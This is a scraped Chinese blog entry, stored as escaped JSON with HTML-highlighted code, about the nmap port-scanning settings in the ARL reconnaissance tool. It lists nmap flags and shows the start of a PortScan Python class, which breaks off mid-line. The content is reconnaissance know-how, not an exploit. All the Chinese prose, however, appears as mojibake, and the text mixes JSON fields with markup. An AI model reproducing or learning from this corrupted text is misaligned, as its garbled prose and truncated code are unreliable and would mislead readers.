ä¸åšdnsè§£æ\nâ€”open åªæ˜¾ç¤ºå¼€æ”¾æˆ–å¯èƒ½å¼€æ”¾çš„ç«¯å£\n-sV æ¢æµ‹å¼€æ”¾ç«¯å£çš„æœåŠ¡\n-O å¯ç”¨æ“ä½œç³»ç»Ÿç‰ˆæœ¬æ¢æµ‹\n-PE åŸºäºICMPçš„echoçš„ä¸»æœºå‘ç°\n-PS[portlist] åŸºäºTCP SYNæŒ‡å®šç«¯å£çš„ä¸»æœºå‘ç°\n-Pn è·³è¿‡ä¸»æœºå‘ç°ï¼Œè§†æ‰€æœ‰ä¸»æœºéƒ½åœ¨çº¿\nç„¶åæ˜¯å¯¹äºæ‰«æç»“æœçš„å¤„ç†\nå¦‚æœä¸€ä¸ªipçš„ç«¯å£å¼€æ”¾äº†600ä¸ªä»¥ä¸Šï¼Œåˆ™åªç•™ä¸‹80å’Œ443ç«¯å£çš„ä¿¡æ¯ ","permalink":"https://www.hacktech.cn/post/arl-nmap-strategy.html","summary":"\u003cp\u003eç¯å¡”ï¼ˆARLï¼‰é‡Œé¢æœ‰ä¸€ä¸ªnampæ‰«ææ¨¡å—ï¼Œé‡Œé¢æœ‰é…ç½®å¯ä»¥å­¦ä¹ ä¸€ä¸‹\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆä¸Šä»£ç \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 7\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 8\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 9\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e10\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e11\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e12\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e13\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e14\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e15\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e16\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e17\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e18\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e19\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e20\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e21\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e22\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e23\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e24\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e25\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e26\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e27\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e28\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e29\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e30\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e31\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e32\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e33\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e34\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e35\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e36\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e37\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e38\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e39\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e40\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e41\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e42\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e43\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e44\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e45\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e46\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e47\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e48\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e49\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e50\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e51\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e52\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e53\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e54\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e55\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e56\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e57\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e58\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e59\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e60\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e61\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e62\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e63\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e64\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e65\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e66\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e67\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e68\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e69\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e70\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e71\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e72\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e73\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e74\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e75\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e76\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e77\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e78\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e79\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e80\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e81\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e82\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e83\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e84\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e85\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e86\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e87\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e88\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e89\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e90\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e91\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e92\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e93\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e94\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e95\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePortScan\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e __init__(self, targets, ports\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e, service_detect\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e, os_detect\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                 port_parallelism\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e, port_min_rate\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e, custom_host_timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etargets \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; \u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejoin(targets)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eports \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e ports\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emax_hostgroup \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ealive_port \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;22,80,443,843,3389,8007-8011,8443,9090,8080-8091,8093,8099,5000-5004,2222,3306,1433,21,25\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-sT -n --open\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emax_retries \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehost_timeout \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparallelism \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e port_parallelism  \u003cspan style=\"color:#75715e\"\u003e# é»˜è®¤ 32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emin_rate \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e port_min_rate  \u003cspan style=\"color:#75715e\"\u003e# é»˜è®¤64\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e service_detect:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehost_timeout \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; -sV\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e os_detect:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehost_timeout \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; -O\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eports\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esplit(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;,\u0026#34;\u003c/span\u003e)) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; -PE -PS\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eformat(self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ealive_port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emax_retries \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eports \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0-65535\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enmap_arguments \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; -Pn\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eports \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0-65535\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emax_hostgroup \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emin_rate \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e max(self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emin_rate, \u003cspan 